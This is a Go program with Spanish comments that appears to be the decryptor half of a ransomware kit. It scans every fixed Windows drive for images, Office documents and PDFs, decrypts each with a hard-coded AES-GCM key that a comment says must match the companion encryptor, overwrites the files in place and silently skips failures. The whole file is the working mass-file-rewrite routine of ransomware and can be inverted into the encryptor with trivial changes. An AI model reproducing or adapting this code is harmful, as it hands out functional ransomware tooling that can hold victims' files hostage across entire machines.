package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows" // Necesario para GetDriveType (go get golang.org/x/sys/windows)
)

const (
	aesKeyHex = "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff" // CLAVE (debe coincidir exactamente con el cifrador)

)

var targetExts = map[string]bool{
	".jpg":  true,
	".jpeg": true,
	".png":  true,
	".gif":  true,
	".docx": true,
	".xlsx": true,
	".pptx": true,
	".pdf":  true,
}

func main() {
	key, err := hex.DecodeString(aesKeyHex)
	if err != nil {
		os.Exit(1)
	}

	// Detectar todas las unidades fijas y descifrar en ellas
	volumes := getFixedVolumes()

	_ = filepath.WalkDir
	for _, vol := range volumes {
		_ = filepath.Walk(vol, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return filepath.SkipDir
			}
			if info.IsDir() {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(path))
			if !targetExts[ext] {
				return nil
			}

			_ = decryptFile(path, key)
			return nil
		})
	}

	notifyGlobalChange()

	os.Exit(0)
}

// getFixedVolumes devuelve todas las unidades fijas del sistema (C:\, D:\, etc.)
func getFixedVolumes() []string {
	var volumes []string

	for drive := 'A'; drive <= 'Z'; drive++ {
		vol := string(drive) + `:\`

		if _, err := os.Stat(vol); err == nil {
			volUTF16, err := syscall.UTF16PtrFromString(vol)
			if err != nil {
				continue
			}

			driveType := windows.GetDriveType(volUTF16)

			// DRIVE_FIXED = 3 → unidades internas (disco duro, SSD, etc.)
			if driveType == windows.DRIVE_FIXED {
				volumes = append(volumes, vol)
			}
		}
	}

	return volumes
}

func decryptFile(path string, key []byte) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	if len(data) < 12 {
		return nil
	}

	nonce := data[:12]
	ciphertext := data[12:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil // ignorar silenciosamente si no se puede descifrar
	}

	err = os.WriteFile(path, plaintext, 0644)
	if err == nil {
		notifyFileChange(path)
	}
	return err
}

// Notifica al Explorador de Windows que el archivo ha cambiado
func notifyFileChange(path string) {
	const (
		SHCNE_UPDATEITEM = 0x00002000
		SHCNF_PATHW      = 0x0005
	)

	pathUTF16, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}

	shell32 := syscall.MustLoadDLL("shell32.dll")
	proc := shell32.MustFindProc("SHChangeNotify")

	proc.Call(
		uintptr(SHCNE_UPDATEITEM),
		uintptr(SHCNF_PATHW),
		uintptr(unsafe.Pointer(pathUTF16)),
		0,
	)
}

func notifyGlobalChange() {
	const (
		SHCNE_ASSOCCHANGED = 0x08000000
		SHCNF_IDLIST       = 0x0000
	)

	shell32 := syscall.MustLoadDLL("shell32.dll")
	proc := shell32.MustFindProc("SHChangeNotify")

	proc.Call(
		uintptr(SHCNE_ASSOCCHANGED),
		uintptr(SHCNF_IDLIST),
		0,
		0,
	)
}
